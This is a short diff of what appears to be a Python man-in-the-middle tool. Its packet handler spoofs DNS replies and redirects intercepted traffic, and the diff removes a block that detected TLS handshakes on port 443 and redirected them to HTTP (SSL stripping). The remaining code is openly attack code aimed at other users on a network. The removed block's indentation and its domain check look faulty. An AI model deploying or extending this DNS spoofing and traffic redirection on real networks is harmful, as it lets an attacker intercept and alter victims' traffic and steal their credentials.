@@ -79,22 +79,6 @@ def handle_incoming_packet(packet):
                 dns_spoof(packet, redirect_ip)
             else:
                 redirect_packet(dst_mac, packet)
-                # Detect HTTPS (port 443) and strip to HTTP
-        if packet.haslayer(TCP) and packet[TCP].dport == 443:
-            # Assume it's the first TLS handshake (Client Hello)
-            domain = None
-            if packet.haslayer(Raw):
-                raw_payload = bytes(packet[TCP].payload)
-                if raw_payload[:1] == b'\x16' and raw_payload[1:3] in [b'\x03\x00', b'\x03\x01', b'\x03\x02', b'\x03\x03', b'\x03\x04']: # TLS Handshake
-                    with dns_targets_lock:
-                        for target_domain, redirect_ip in dns_targets.items():
-                            if get_mac(packet[IP].dst):  # check we spoofed this domain
-                                domain = target_domain
-                                break
-
-            if domain:
-                redirect_http(packet, domain)
-                return  # Stop further processing
 
         else:
             redirect_packet(dst_mac, packet)
